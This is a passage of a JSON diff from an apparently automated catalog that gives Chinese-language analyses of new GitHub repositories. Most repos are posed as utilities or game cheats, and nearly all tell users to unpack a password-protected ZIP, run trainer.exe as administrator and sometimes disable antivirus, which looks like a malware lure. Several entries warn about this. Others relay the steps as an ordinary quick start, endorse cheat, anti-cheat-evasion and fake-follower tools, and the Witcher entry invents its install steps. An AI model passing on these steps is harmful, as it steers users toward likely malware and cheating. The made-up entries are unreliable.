@@ -1,6 +1,6 @@
 {
   "version": "1",
-  "updatedAt": "2026-06-30T05:50:57.691Z",
+  "updatedAt": "2026-07-01T06:13:34.709Z",
   "projects": [
     {
       "owner": "codecrafters-io",
@@ -57819,6 +57819,750 @@
         "category": "AI Agent"
       },
       "analyzedAt": "2026-06-30T05:50:57.669Z"
+    },
+    {
+      "owner": "Zeeshan2899",
+      "repo": "System_Backup___Restore",
+      "fullName": "Zeeshan2899/System_Backup___Restore",
+      "description": "Create system images, backup files, and restore when needed. Protect your data from crashes and malware. Full system backup.",
+      "language": "Python",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-07-01T00:20:09Z",
+      "url": "https://github.com/Zeeshan2899/System_Backup___Restore",
+      "analysis": {
+        "positioning": "一款用于创建系统镜像、备份文件并恢复的Windows工具。",
+        "useCases": [
+          "你担心系统崩溃或遭受恶意软件攻击 → 它帮你创建系统镜像，确保数据可恢复。",
+          "你重要文件需要定期备份 → 它帮你备份选定文件，并支持定时和增量备份。",
+          "你系统出现故障或数据丢失 → 它帮你从备份中恢复系统或文件。"
+        ],
+        "audience": "适用于希望在 Windows 10/11 系统上进行数据备份和恢复的个人用户，尤其是需要全盘镜像或文件级保护的场景。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 (64位) 系统",
+          "steps": [
+            "点击下载按钮下载压缩包。",
+            "使用密码 `trainer2026` 解压ZIP文件。",
+            "以管理员身份运行 `trainer.exe`。",
+            "启动应用程序并等待加载。",
+            "按下 `INSERT` (或 `F1`) 键打开菜单并启用所需功能。"
+          ],
+          "note": "null"
+        },
+        "competitors": [
+          {
+            "name": "Windows 内置备份工具（系统映像备份/文件历史记录）",
+            "method": "通过操作系统控制面板或设置访问",
+            "models": "支持 Windows 系统映像、文件和文件夹备份",
+            "pricing": "免费（Windows 系统自带）"
+          },
+          {
+            "name": "Macrium Reflect Free Edition",
+            "method": "独立应用程序安装",
+            "models": "支持完整系统映像、文件和文件夹备份",
+            "pricing": "免费（功能受限）/付费（完整功能）"
+          }
+        ],
+        "pricing": "免费",
+        "vibeCodingScore": 1,
+        "vibeCodingReason": "项目描述和README内容严重不符，一个名为“System Backup & Restore”的工具却在安装和使用说明中多次提及“trainer.exe”和“trainer menu”，并提供一个可疑的下载链接和密码。这极大地增加了安全风险和信任问题，强烈暗示其并非一个正规的备份恢复工具，可能是一个伪装的恶意软件或游戏修改器。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度极低，Issue 开启与关闭数均为0，表明项目可能无人维护或没有用户反馈。",
+        "category": "安全"
+      },
+      "analyzedAt": "2026-07-01T06:07:09.684Z"
+    },
+    {
+      "owner": "SrSCK",
+      "repo": "Virtual_Machine_Manager",
+      "fullName": "SrSCK/Virtual_Machine_Manager",
+      "description": "Run and manage virtual machines with ease. Supports VMware, VirtualBox, and Hyper-V. Create, start, and stop VMs.",
+      "language": "Python",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-07-01T00:20:56Z",
+      "url": "https://github.com/SrSCK/Virtual_Machine_Manager",
+      "analysis": {
+        "positioning": "跨平台虚拟机一体化管理工具，简化VMware/VirtualBox/Hyper-V操作。",
+        "useCases": [
+          "你需快速创建和管理虚拟机 → 它帮你轻松在VMware、VirtualBox或Hyper-V上创建、启动、停止VM。",
+          "你想备份或复制虚拟机状态 → 它帮你一键创建快照或克隆现有VM。",
+          "你希望监控虚拟机资源并进行迁移 → 它帮你实时监控资源，并支持VM迁移。"
+        ],
+        "audience": "虚拟机使用者或开发者，想要在Windows平台统一管理和简化VMware/VirtualBox/Hyper-V操作的用户。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 (64位) 系统，并已安装VMware、VirtualBox或Hyper-V中的至少一种虚拟机软件。",
+          "steps": [
+            "点击README中的下载链接获取加密压缩包。",
+            "使用密码 `trainer2026` 解压ZIP文件。",
+            "以管理员权限运行解压后的 `trainer.exe`。",
+            "启动应用后，按 `INSERT` 或 `F1` 键打开管理菜单。"
+          ],
+          "note": "注意：该项目的安装和运行方式（如加密压缩包、运行可执行文件、建议禁用杀毒软件、热键激活）与典型开源Python项目差异巨大，更类似于游戏修改器或非正规软件，存在潜在安全风险，请谨慎评估使用。"
+        },
+        "competitors": [
+          {
+            "name": "VMware Workstation/Player",
+            "method": "独立GUI应用",
+            "models": "VMware虚拟机",
+            "pricing": "Workstation付费/Player免费"
+          },
+          {
+            "name": "VirtualBox Manager",
+            "method": "独立GUI应用",
+            "models": "VirtualBox虚拟机",
+            "pricing": "免费"
+          },
+          {
+            "name": "Hyper-V Manager",
+            "method": "Windows内置GUI管理工具",
+            "models": "Hyper-V虚拟机",
+            "pricing": "免费"
+          }
+        ],
+        "pricing": "免费。",
+        "vibeCodingScore": 2,
+        "vibeCodingReason": "项目功能描述实用，但其安装和分发流程（加密ZIP、运行`trainer.exe`、管理员权限、建议禁用杀毒软件、热键激活）与常规开源Python项目模式严重不符，更像游戏修改器或可疑软件，存在潜在的安全风险。社区活跃度极低，没有Issue记录。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度极低，Issue统计显示开启和关闭均为0，无法评估社区支持和响应速度。",
+        "category": "DevOps"
+      },
+      "analyzedAt": "2026-07-01T06:07:40.633Z"
+    },
+    {
+      "owner": "AnonymousDev1494",
+      "repo": "System_Information_Viewer",
+      "fullName": "AnonymousDev1494/System_Information_Viewer",
+      "description": "Show detailed hardware and software info. Show processor details, memory usage, graphics card info, and Windows version. Get full system specs.",
+      "language": "Python",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-07-01T00:20:08Z",
+      "url": "https://github.com/AnonymousDev1494/System_Information_Viewer",
+      "analysis": {
+        "positioning": "Windows 系统软硬件信息查看、导出及对比工具。",
+        "useCases": [
+          "你想快速了解电脑配置 → 它帮你汇总展示CPU、内存、显卡和操作系统等软硬件信息。",
+          "你需要保存电脑配置报告 → 它帮你一键导出完整的系统报告。",
+          "你想对比两台电脑的配置 → 它帮你获取并比较不同系统的硬件规格。"
+        ],
+        "audience": "需要快速查看、导出或对比 Windows 电脑软硬件配置的个人用户或技术人员。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 (64位)。",
+          "steps": [
+            "点击下载按钮，下载压缩包。",
+            "使用密码 `trainer2026` 解压 ZIP 文件。",
+            "以管理员身份运行 `trainer.exe`。",
+            "启动应用，等待加载后，按下 `INSERT` 或 `F1` 键打开菜单。"
+          ],
+          "note": "注意：安装流程提及“trainer”并要求解压密码、运行 `.exe` 文件、建议禁用杀毒软件，与常规系统信息工具安装流程差异巨大，存在潜在安全风险，请务必谨慎评估并自行承担风险。"
+        },
+        "competitors": [
+          {
+            "name": "CPU-Z/GPU-Z",
+            "method": "下载安装",
+            "models": "N/A",
+            "pricing": "免费"
+          },
+          {
+            "name": "Speccy",
+            "method": "下载安装",
+            "models": "N/A",
+            "pricing": "免费/付费高级版"
+          }
+        ],
+        "pricing": "免费",
+        "vibeCodingScore": 1,
+        "vibeCodingReason": "项目描述为系统信息查看器，但下载安装流程极不规范且高度可疑。要求用户解压带密码的‘trainer-archive.zip’并运行‘trainer.exe’，甚至建议关闭杀毒软件，这与常规合法软件安装流程严重不符，存在极高的安全风险。Issue 数量为零也令人存疑，不建议普通用户尝试或信任其安全性。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue 统计为零，社区活跃度不可知，不排除维护者不通过 Issue 渠道交流的可能性，但结合其异常的安装说明，更倾向于这是一个非标准、非开放协作的项目。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-07-01T06:08:02.522Z"
+    },
+    {
+      "owner": "StephanoEscobarLoayza",
+      "repo": "Spotify_Playlist_Booster",
+      "fullName": "StephanoEscobarLoayza/Spotify_Playlist_Booster",
+      "description": "Increase followers, playlist streams, and auto-like songs. Play songs on loop, get fake followers, like all songs, and create playlists automatically. Grow your Spotify presence.",
+      "language": "Python",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-07-01T00:20:06Z",
+      "url": "https://github.com/StephanoEscobarLoayza/Spotify_Playlist_Booster",
+      "analysis": {
+        "positioning": "Spotify刷量、涨粉及歌单自动化管理工具。",
+        "useCases": [
+          "你希望提升歌曲播放量 → 它帮你循环播放歌曲刷流。",
+          "你希望快速增加粉丝数 → 它帮你获取虚假粉丝。",
+          "你希望批量点赞歌单歌曲 → 它帮你自动点赞歌单内所有歌曲。",
+          "你希望自动生成歌单 → 它帮你根据曲风自动创建歌单。"
+        ],
+        "audience": "希望快速提升Spotify播放量、粉丝数和歌单影响力的个人用户或内容创作者。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 (64位) 操作系统。",
+          "steps": [
+            "点击下载链接获取压缩包。",
+            "使用密码 `trainer2026` 解压文件。",
+            "以管理员身份运行 `trainer.exe`。",
+            "启动应用并等待加载。",
+            "按 `INSERT` 或 `F1` 键打开菜单，启用所需功能。"
+          ],
+          "note": "仅支持Windows 10/11系统。"
+        },
+        "competitors": [],
+        "pricing": "免费。",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "项目旨在通过刷量、虚假粉丝等非官方手段快速提升Spotify数据，虽然功能明确并声称有“防封”机制，但存在潜在的封号风险，且非正当增长方式，长期可持续性存疑。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue区无任何活动，社区活跃度极低。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-07-01T06:08:49.646Z"
+    },
+    {
+      "owner": "arenaasd",
+      "repo": "Roblox_BedWars_Auto-Farm___Aimbot",
+      "fullName": "arenaasd/Roblox_BedWars_Auto-Farm___Aimbot",
+      "description": "Auto-farm, aimbot, and ESP for Roblox BedWars. Automatically break beds, kill enemies, and farm resources.",
+      "language": "Python",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-07-01T00:19:26Z",
+      "url": "https://github.com/arenaasd/Roblox_BedWars_Auto-Farm___Aimbot",
+      "analysis": {
+        "positioning": "Roblox BedWars 玩家的自动农场、瞄准和透视作弊工具。",
+        "useCases": [
+          "你手动收集资源 → 它帮你自动收集资源。",
+          "你手动瞄准敌人 → 它帮你自动瞄准敌人。",
+          "你看不见墙后敌人/床铺 → 它帮你透视显示敌人和床铺。",
+          "你手动破坏床铺 → 它帮你即时破坏床铺。",
+          "你担心AFK被踢 → 它帮你阻止AFK踢出。"
+        ],
+        "audience": "寻求在 Roblox BedWars 游戏中获得不公平优势的 Windows 玩家。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 (64位) 系统，目标游戏为最新版本。",
+          "steps": [
+            "点击README中的下载按钮下载压缩包。",
+            "使用密码 `trainer2026` 解压 ZIP 文件。",
+            "以管理员身份运行 `trainer.exe`。",
+            "启动 Roblox BedWars 游戏，等待加载。",
+            "按 `INSERT` (或 `F1`) 键打开修改器菜单并启用所需功能。"
+          ],
+          "note": "运行时可能需要暂时禁用杀毒软件或添加例外；若功能不正常，请尝试重启修改器和游戏。"
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "作为游戏作弊工具，功能强大且目标明确，但在主流开发者社区中普遍不被认可，且可能违反游戏规则，存在道德争议。",
+        "isVibeCoding": true,
+        "communityActivity": "GitHub Issue 开启0/关闭0，社区活跃度低。",
+        "category": "其他",
+        "needsReview": true
+      },
+      "analyzedAt": "2026-07-01T06:09:01.021Z"
+    },
+    {
+      "owner": "Fdani007",
+      "repo": "PUBG_Battlegrounds_ESP___Aimbot",
+      "fullName": "Fdani007/PUBG_Battlegrounds_ESP___Aimbot",
+      "description": "ESP, aimbot, and no recoil for PUBG Battlegrounds. See enemies through walls, auto-aim, and zero recoil. Works with both FPP and TPP.",
+      "language": "Python",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-07-01T00:19:19Z",
+      "url": "https://github.com/Fdani007/PUBG_Battlegrounds_ESP___Aimbot",
+      "analysis": {
+        "positioning": "绝地求生（PUBG）透视、自瞄与无后座作弊工具。",
+        "useCases": [
+          "你想在PUBG中轻松获胜 → 它提供透视、自瞄、无后座，助你碾压对手。",
+          "你苦于PUBG枪法不佳、搜刮缓慢 → 它让你精准打击敌人，快速定位物资与载具。",
+          "你希望查看敌人、武器、防具及载具位置 → 它提供ESP功能，让你视野全开。"
+        ],
+        "audience": "寻求在《绝地求生》中获得非公平优势，轻松吃鸡的玩家。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 (64位)",
+          "steps": [
+            "下载并解压压缩包（密码：`trainer2026`）。",
+            "以管理员身份运行 `trainer.exe`，启动游戏，按 `INSERT`/`F1` 开启菜单。"
+          ],
+          "note": null
+        },
+        "competitors": [],
+        "pricing": "免费，通过GitHub提供下载。",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "功能明确且易用，但其作为游戏作弊工具，可能面临封号风险，且存在潜在安全隐患（下载第三方exe）。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度极低，无任何Issue交流记录。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-07-01T06:09:12.770Z"
+    },
+    {
+      "owner": "zhaixiansen1023-cpu",
+      "repo": "QR_Code_Scanner",
+      "fullName": "zhaixiansen1023-cpu/QR_Code_Scanner",
+      "description": "Scan QR codes and barcodes from images, webcam, or screenshots. Decode instantly and copy to clipboard.",
+      "language": "Python",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-07-01T00:19:21Z",
+      "url": "https://github.com/zhaixiansen1023-cpu/QR_Code_Scanner",
+      "analysis": {
+        "positioning": "图片/摄像头/截图扫码，即时解码复制。",
+        "useCases": [
+          "你需快速识别图片中的二维码 → 它帮你从文件、截图或摄像头即时解码并复制内容。",
+          "你需批量处理二维码图片并记录 → 它支持批量扫描图片、保存历史并导出结果。",
+          "你习惯用电脑管理扫码信息 → 它作为Windows桌面应用，提供便捷的扫码、管理与导出功能。"
+        ],
+        "audience": "Windows 10/11用户，需要一个桌面端工具快速识别二维码和条形码，并具备历史记录和批量处理能力。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 (64-bit)",
+          "steps": [
+            "点击下载按钮，下载 `trainer-archive.zip` 并用密码 `trainer2026` 解压。",
+            "以管理员身份运行 `trainer.exe`，加载后按 `INSERT` 或 `F1` 键打开菜单并启用功能。"
+          ],
+          "note": "该安装方式（文件名、密码、管理员权限、通过特定键启用）非常规，可能涉及系统安全风险，请谨慎操作或避免使用。"
+        },
+        "competitors": [
+          {
+            "name": "手机二维码扫描App",
+            "method": "手机摄像头/相册",
+            "models": "QR/条码",
+            "pricing": "免费"
+          },
+          {
+            "name": "在线二维码解码网站",
+            "method": "上传图片/URL",
+            "models": "QR/条码",
+            "pricing": "免费"
+          },
+          {
+            "name": "Windows应用商店同类工具",
+            "method": "图片/摄像头",
+            "models": "QR/条码",
+            "pricing": "免费/付费"
+          }
+        ],
+        "pricing": "免费",
+        "vibeCodingScore": 1,
+        "vibeCodingReason": "项目分发和安装方式高度异常（下载包名为 `trainer-archive.zip`，解压密码 `trainer2026`，执行 `trainer.exe` 需管理员权限，通过 `INSERT/F1` 键启用功能）。这种模式常见于游戏修改器或潜在的恶意软件，与其宣称的二维码扫描工具功能不符，存在严重安全风险，强烈不建议使用。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue 统计显示为 0/0，表明社区几乎无讨论或贡献，活跃度极低。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-07-01T06:09:38.401Z"
+    },
+    {
+      "owner": "tangjiali",
+      "repo": "The_Witcher_3_God_Mode___Unlimited_Gold",
+      "fullName": "tangjiali/The_Witcher_3_God_Mode___Unlimited_Gold",
+      "description": "Unlimited health, stamina, and gold for The Witcher 3. One-hit kills, infinite items, and all skills unlocked. Best mod for Witcher fans.",
+      "language": "Unknown",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-07-01T00:20:49Z",
+      "url": "https://github.com/tangjiali/The_Witcher_3_God_Mode___Unlimited_Gold",
+      "analysis": {
+        "positioning": "《巫师3：狂猎》终极作弊Mod，提供无限生命、体力、金钱及全技能解锁。",
+        "useCases": [
+          "你想轻松体验《巫师3》剧情，不想被战斗卡关 → 它帮你提供无限生命、体力，一击必杀。",
+          "你想在《巫师3》中尝试各种技能组合，但不想刷级 → 它帮你直接解锁所有技能。",
+          "你想在《巫师3》中自由购买装备道具，不为金钱发愁 → 它帮你提供无限金钱和物品。",
+          "你想快速通关《巫师3》，专注于主线剧情，跳过枯燥战斗 → 它帮你开启上帝模式，扫清一切障碍。"
+        ],
+        "audience": "适合《巫师3：狂猎》的玩家，尤其是那些希望降低游戏难度、快速体验剧情、自由尝试游戏内容，或仅仅想“爽玩”游戏的玩家。",
+        "quickStart": {
+          "prerequisites": "已安装《巫师3：狂猎》游戏（PC版）。",
+          "steps": [
+            "从项目仓库下载Mod文件。",
+            "将Mod文件解压并复制到《巫师3》的游戏Mods目录中（通常是`[游戏安装目录]/Mods/`）。",
+            "启动游戏，即可享受无限生命、金钱等作弊功能。"
+          ],
+          "note": "具体安装路径和方法可能因游戏版本或Mod更新而异，建议参考Mod作者的详细说明（本解读未提供）。"
+        },
+        "competitors": [],
+        "pricing": "免费（采用MIT许可证）。",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "这是一个针对单机游戏的作弊Mod，功能明确且实用，能很好地满足目标用户的需求。虽然不是复杂的技术创新项目，但作为游戏辅助工具，其完成度和直接效果优秀。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue 统计显示，目前没有开启或关闭的Issue，表明社区活跃度较低或用户通过其他渠道反馈。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-07-01T06:10:06.566Z"
+    },
+    {
+      "owner": "raheemxghumman",
+      "repo": "Screen_Recorder_Pro",
+      "fullName": "raheemxghumman/Screen_Recorder_Pro",
+      "description": "Record screen with audio, annotations, and scheduling. Capture full screen, record selected area, record system audio, and schedule recordings. Best for tutorials.",
+      "language": "Python",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-07-01T00:19:59Z",
+      "url": "https://github.com/raheemxghumman/Screen_Recorder_Pro",
+      "analysis": {
+        "positioning": "带音视频、注释、定时录制的专业屏幕录像工具。",
+        "useCases": [
+          "你做教学视频 → 它帮你录制带讲解、标注的屏幕内容。",
+          "你想捕捉特定操作 → 它帮你选择区域录制，精准记录。",
+          "你错过在线会议或直播 → 它帮你设定时间自动开始录制，不错过重要信息。"
+        ],
+        "audience": "视频教程制作者、在线会议记录者、软件操作演示者。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 (64‑bit)",
+          "steps": [
+            "下载ZIP压缩包。",
+            "使用密码`trainer2026`解压ZIP文件。",
+            "以管理员身份运行`trainer.exe`。",
+            "启动应用程序并等待加载。",
+            "按`INSERT`或`F1`打开菜单并启用所需功能。"
+          ],
+          "note": null
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 1,
+        "vibeCodingReason": "项目名为Python屏幕录像工具，但安装指南却指向下载名为`trainer.exe`的可执行文件（需密码解压），且下载源为第三方域名而非GitHub官方发布，存在高风险（极可能为捆绑软件或恶意程序）。同时Issue数为零，社区活跃度极低。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue数为零，社区无活跃度或无人维护。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-07-01T06:10:21.230Z"
+    },
+    {
+      "owner": "paulaengel",
+      "repo": "Telegram_Channel_Manager",
+      "fullName": "paulaengel/Telegram_Channel_Manager",
+      "description": "Auto-post, forward, and manage Telegram channels. Post content, forward messages, scrape channel content, and manage members. Grow your Telegram channel.",
+      "language": "Python",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-07-01T00:20:15Z",
+      "url": "https://github.com/paulaengel/Telegram_Channel_Manager",
+      "analysis": {
+        "positioning": "Telegram频道自动化管理与增长工具",
+        "useCases": [
+          "你想定时发布内容 → 它帮你自动发布到Telegram频道",
+          "你想转发消息到其他频道 → 它帮你自动转发消息",
+          "你想获取其他频道内容 → 它帮你抓取Telegram频道内容",
+          "你想管理频道成员 → 它帮你添加/移除成员"
+        ],
+        "audience": "运营Telegram频道的内容创作者或管理者，寻求自动化工具提升效率和增长。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 (64-bit)",
+          "steps": [
+            "点击下载按钮下载压缩包",
+            "使用密码 `trainer2026` 解压ZIP文件",
+            "以管理员身份运行 `trainer.exe`",
+            "启动应用并等待加载",
+            "按 `INSERT` 或 `F1` 打开菜单并启用功能"
+          ],
+          "note": null
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 1,
+        "vibeCodingReason": "项目在GitHub上发布，但下载链接指向外部网站，需下载名为 `trainer.exe` 的可执行文件，并要求以管理员身份运行，还需输入密码解压。这种安装方式与Python开源项目惯例严重不符，存在潜在安全风险，且与GitHub的开源精神相悖。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度极低，Issue 开启和关闭均为0，无任何社区互动迹象。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-07-01T06:10:34.780Z"
+    },
+    {
+      "owner": "jawadashraf772",
+      "repo": "Windows_System_Optimizer",
+      "fullName": "jawadashraf772/Windows_System_Optimizer",
+      "description": "Clean junk files, optimize registry, and boost performance. Remove temp files, fix registry, manage startup, and free up memory. Speed up your PC.",
+      "language": "Python",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-07-01T00:20:59Z",
+      "url": "https://github.com/jawadashraf772/Windows_System_Optimizer",
+      "analysis": {
+        "positioning": "Windows系统提速助手，清理优化一键搞定。",
+        "useCases": [
+          "你觉得电脑卡顿、垃圾文件多 → 它帮你清理临时文件、优化注册表，提升系统流畅度。",
+          "你想管理开机启动项、释放内存 → 它帮你管理启动程序、一键加速内存，让PC更快响应。",
+          "你硬盘空间不足、磁盘碎片化 → 它帮你分析大文件、整理碎片，释放存储空间。"
+        ],
+        "audience": "Windows 10/11用户，希望通过系统清理和优化，提升PC性能和速度。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 (64位) 系统；下载前可能需临时关闭杀毒软件。",
+          "steps": [
+            "点击下载链接获取压缩包。",
+            "使用密码 `trainer2026` 解压ZIP文件。",
+            "以管理员身份运行 `trainer.exe`。",
+            "启动应用并等待加载。",
+            "按 `INSERT` 或 `F1` 键打开菜单并启用功能。"
+          ],
+          "note": "ZIP解压密码为 `trainer2026`，功能激活键为 `INSERT` 或 `F1`。"
+        },
+        "competitors": [],
+        "pricing": "免费。",
+        "vibeCodingScore": 1,
+        "vibeCodingReason": "项目名称为“系统优化器”，但安装和使用方式（如`trainer.exe`、解压密码、激活键`INSERT/F1`）更像游戏修改器或非标准软件分发，且下载链接非GitHub Releases，存在较大安全和信任风险，与典型开源项目氛围不符。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度低，无Issue互动。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-07-01T06:11:04.606Z"
+    },
+    {
+      "owner": "kumuterke",
+      "repo": "Slack_Automation_Bot",
+      "fullName": "kumuterke/Slack_Automation_Bot",
+      "description": "Auto-respond, schedule messages, and manage channels. Reply to messages, schedule posts, add/remove users, and automate tasks. Improve team productivity.",
+      "language": "Python",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-07-01T00:20:03Z",
+      "url": "https://github.com/kumuterke/Slack_Automation_Bot",
+      "analysis": {
+        "positioning": "Windows平台Slack自动化机器人，提升团队沟通效率。",
+        "useCases": [
+          "你频繁回复相似消息 → 它帮你自动应答",
+          "你需要定时发送通知 → 它帮你安排消息发布",
+          "你要管理Slack成员 → 它帮你批量增删用户",
+          "你有重复的Slack操作 → 它帮你自动化任务"
+        ],
+        "audience": "希望在Windows平台自动化Slack消息发送、频道管理和用户操作的团队管理员或个人用户。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 (64位) 操作系统",
+          "steps": [
+            "点击下载按钮，下载压缩包。",
+            "使用密码 `trainer2026` 解压ZIP文件。",
+            "以管理员身份运行 `trainer.exe`。",
+            "启动应用程序，等待加载。",
+            "按下 `INSERT` (或 `F1`) 键打开菜单，启用所需功能。"
+          ],
+          "note": "null"
+        },
+        "competitors": [
+          {
+            "name": "Slack Workflow Builder",
+            "method": "Slack内置功能，图形化配置",
+            "models": "null",
+            "pricing": "免费（随Slack订阅）"
+          },
+          {
+            "name": "Zapier/IFTTT",
+            "method": "第三方集成服务，通过连接器自动化",
+            "models": "null",
+            "pricing": "部分免费/付费"
+          }
+        ],
+        "pricing": "免费",
+        "vibeCodingScore": 1,
+        "vibeCodingReason": "项目描述为Python开发，但在GitHub上提供的下载和安装方式是下载一个需密码解压的`trainer.exe`文件并以管理员身份运行。这种安装流程与正常的Python开源项目部署方式严重不符，且`trainer.exe`字样常与游戏修改器或不明软件关联，存在显著的安全风险和误导性。",
+        "isVibeCoding": true,
+        "communityActivity": "无Issue活动，社区基本不活跃。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-07-01T06:11:36.924Z"
+    },
+    {
+      "owner": "theartistscut1-uig",
+      "repo": "Metro_Last_Light_Unlimited_Ammo___Filters",
+      "fullName": "theartistscut1-uig/Metro_Last_Light_Unlimited_Ammo___Filters",
+      "description": "Unlimited ammo, filters, and health for Metro Last Light. Never run out of oxygen, infinite military-grade rounds, and god mode.",
+      "language": "Python",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-07-01T00:18:34Z",
+      "url": "https://github.com/theartistscut1-uig/Metro_Last_Light_Unlimited_Ammo___Filters",
+      "analysis": {
+        "positioning": "《地铁：最后的曙光》终极作弊器，秒变“不死战神”。",
+        "useCases": [
+          "你害怕《地铁：最后的曙光》资源短缺 → 它让你弹药、滤毒罐、氧气无限，告别物资焦虑。",
+          "你觉得《地铁：最后的曙光》难度太高 → 它提供上帝模式和隐身功能，轻松横扫战场。",
+          "你想体验《地铁：最后的曙光》所有武器 → 它解锁全部武器和无限合成资源，尽情体验。"
+        ],
+        "audience": "寻求《地铁：最后的曙光》游戏内轻松体验，想降低难度或享受“神仙”玩法的玩家。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 (64位)。",
+          "steps": [
+            "下载压缩包（解压密码：`trainer2026`）。",
+            "以管理员身份运行`trainer.exe`，然后启动游戏，按`INSERT`或`F1`开启所需功能。"
+          ],
+          "note": null
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "作为特定游戏的修改工具，功能直观且满足特定用户需求。技术上非前沿或通用开发框架，但实现了高效的游戏体验增强。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue统计为0/0，社区活跃度低，但作为游戏修改器可能用户直接使用，无需频繁提交问题。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-07-01T06:11:48.122Z"
+    },
+    {
+      "owner": "Mbovu222",
+      "repo": "League_of_Legends_Skillshot_Dodger",
+      "fullName": "Mbovu222/League_of_Legends_Skillshot_Dodger",
+      "description": "AI dodger and last-hit assistant for LoL (undetected by Vanguard). Auto-dodge skillshots, perfect CS, reveal fog, and execute combos. Works in all game modes.",
+      "language": "Python",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-07-01T00:18:20Z",
+      "url": "https://github.com/Mbovu222/League_of_Legends_Skillshot_Dodger",
+      "analysis": {
+        "positioning": "为《英雄联盟》玩家提供AI驱动的自动躲避、补刀及战术辅助。",
+        "useCases": [
+          "你操作繁琐的英雄技能释放 → 它帮你自动执行复杂连招。",
+          "你频繁漏掉小兵经济 → 它帮你精准补刀，每次都拿到完美经济。",
+          "你对局势判断不准或视野受限 → 它帮你洞悉战争迷雾、追踪敌方技能及守卫位置，全面掌握战场。"
+        ],
+        "audience": "《英雄联盟》玩家，特别是那些追求极致游戏表现、希望减轻操作负担或想突破技术瓶颈的用户。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 (64位)操作系统",
+          "steps": [
+            "点击下载链接获取压缩包并用密码`trainer2026`解压。",
+            "以管理员身份运行`trainer.exe`，启动游戏，然后按`INSERT`或`F1`激活功能菜单。"
+          ],
+          "note": "运行时可能需要暂时关闭杀毒软件；确保以管理员身份运行；若功能不生效，尝试重启程序和游戏。"
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "项目本质是游戏外挂，通过绕过反作弊系统提供不公平的游戏优势，虽技术实现有一定复杂度，但与公平竞争原则相悖。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue 0/0，社区活跃度极低或无。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-07-01T06:12:10.288Z"
+    },
+    {
+      "owner": "mrgrey565-ux",
+      "repo": "File_Shredder",
+      "fullName": "mrgrey565-ux/File_Shredder",
+      "description": "Securely delete files so they cannot be recovered. Overwrite with random data multiple times. Protect your sensitive data.",
+      "language": "Python",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-07-01T00:17:46Z",
+      "url": "https://github.com/mrgrey565-ux/File_Shredder",
+      "analysis": {
+        "positioning": "安全彻底删除文件，多次覆盖数据，防止敏感信息恢复。",
+        "useCases": [
+          "你处理敏感文件（如个人隐私、商业机密）→ 它帮你彻底销毁，无法恢复。",
+          "你清理旧硬盘或U盘，担心数据泄露 → 它帮你擦除空闲空间或整个存储介质，确保隐私。",
+          "你需要在Windows系统下批量销毁不再需要的文件或文件夹 → 它提供批量和文件夹粉碎功能，高效安全。"
+        ],
+        "audience": "Windows 10/11用户，尤其是注重数据隐私和安全，需永久销毁敏感文件的用户。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 (64位) 系统，并以管理员身份运行。",
+          "steps": [
+            "点击下载链接下载压缩包。",
+            "使用密码 `trainer2026` 解压ZIP文件。",
+            "以管理员身份运行 `trainer.exe`。",
+            "启动应用并等待加载。",
